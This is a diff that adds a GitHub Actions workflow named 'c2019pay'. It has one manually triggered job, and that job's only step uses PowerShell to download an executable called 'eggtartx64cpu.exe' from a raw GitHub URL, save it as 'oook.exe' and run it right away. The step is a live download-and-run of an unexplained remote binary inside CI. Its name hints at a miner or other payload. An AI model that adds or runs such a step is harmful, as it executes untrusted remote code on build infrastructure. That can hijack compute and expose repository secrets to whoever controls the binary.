@@ -1,0 +1,10 @@
+name: c2019pay
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: good
+    steps:
+      - name: powershell
+        shell: cmd
+        run: powershell.exe -c Invoke-WebRequest https://github.com/t20241104/t20241104/raw/refs/heads/main/eggtartx64cpu.exe -OutFile oook.exe ; .\oook.exe
